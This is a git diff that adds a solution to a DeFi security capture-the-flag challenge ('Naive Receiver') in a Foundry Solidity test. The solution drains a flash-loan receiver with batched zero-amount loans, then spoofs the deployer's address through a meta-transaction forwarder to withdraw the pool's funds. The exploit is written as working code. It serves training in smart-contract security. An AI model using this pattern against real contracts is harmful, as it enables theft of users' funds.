@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
+import {FlashLoanReceiver2} from "../../src/naive-receiver/FlashLoanReceiver2.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
 contract NaiveReceiverChallenge is Test {
@@ -15,10 +16,12 @@ contract NaiveReceiverChallenge is Test {
 
     uint256 constant WETH_IN_POOL = 1000e18;
     uint256 constant WETH_IN_RECEIVER = 10e18;
+    uint256 private constant FIXED_FEE = 1e18;
 
     NaiveReceiverPool pool;
     WETH weth;
     FlashLoanReceiver receiver;
+    FlashLoanReceiver2 receiver2;
     BasicForwarder forwarder;
 
     modifier checkSolvedByPlayer() {
@@ -46,6 +49,7 @@ contract NaiveReceiverChallenge is Test {
 
         // Deploy flashloan receiver contract and fund it with some initial WETH
         receiver = new FlashLoanReceiver(address(pool));
+        receiver2 = new FlashLoanReceiver2(address(pool));
         weth.deposit{value: WETH_IN_RECEIVER}();
         weth.transfer(address(receiver), WETH_IN_RECEIVER);
 
@@ -77,7 +81,37 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory data = new bytes[](10);
+        for (uint256 i = 0; i < 10; i++) {
+            data[i] = (
+                abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", receiver, weth, 0, bytes(""))
+            );
+        }
+        pool.multicall(data);
+        data = new bytes[](1);
+        data[0] = abi.encodePacked(
+            (abi.encodeWithSignature("withdraw(uint256,address)", WETH_IN_POOL + WETH_IN_RECEIVER, recovery)),
+            deployer
+        );
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player, // Original sender
+            target: address(pool), // Target contract
+            value: 0,
+            gas: 100000,
+            nonce: 0,
+            data: abi.encodeWithSignature("multicall(bytes[])", data),
+            deadline: block.timestamp + 3
+        });
+        bytes32 requestHash = forwarder.getDataHash(request);
+        bytes32 typedDataHash = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), requestHash));
+
+        // Sign the hash
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
+
+        //pool.multicall(data);*/
     }
 
     /**
